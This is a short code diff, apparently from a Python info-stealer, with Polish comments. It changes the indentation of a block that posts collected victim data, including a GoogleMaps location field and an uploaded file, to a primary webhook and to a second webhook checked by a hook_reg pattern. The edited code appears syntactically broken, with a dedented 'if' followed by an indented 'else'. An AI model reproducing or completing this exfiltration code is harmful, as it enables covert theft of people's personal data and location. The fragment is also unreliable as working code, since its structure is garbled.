@@ -899,10 +899,10 @@ GoogleMaps: {self.googlemap}
         httpx.post(self.webhook, json=embed)
         httpx.post(self.webhook, files={"upload_file": f})
 
-        # Wysyłanie do webhooka 2
-        if self.hook_reg in self.webhook2:
-            httpx.post(self.webhook2, json=embed)
-            httpx.post(self.webhook2, files={"upload_file": f})
+    # Wysyłanie do webhooka 2
+    if self.hook_reg in self.webhook2:
+        httpx.post(self.webhook2, json=embed)
+        httpx.post(self.webhook2, files={"upload_file": f})
             else:
                 from pyotp import TOTP
 
